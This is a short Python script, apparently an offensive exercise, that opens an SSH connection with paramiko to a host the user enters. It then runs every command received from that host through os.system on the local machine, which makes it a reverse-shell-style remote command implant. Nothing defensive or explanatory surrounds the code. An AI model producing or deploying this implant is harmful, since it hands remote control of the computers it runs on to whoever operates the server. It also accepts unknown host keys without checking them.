import socket
import os 
import sys
import paramiko
import threading
import subprocess

#Our Client Recieves commands NOT the server

TargetIP = input('Enter the IP address of the SSH server you wish to access: -> ')
TargetPort = input('Enter the port number: -> ')
UserName = input('Enter your username: -> ')
Passwd = input('Enter your password: -> ')
byts = 1024

client = paramiko.SSHClient()
client.load_system_host_keys()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy)
client.connect(TargetIP, TargetPort, UserName, Passwd)
SSHSession = client.get_transport().open_session()

if SSHSession.active:
    while True:
    
        Response = SSHSession.recv(byts)
                
        if Response:
            print("Command recieved!")
            Decoded = Response.decode('utf-8')
            os.system(Decoded)
        

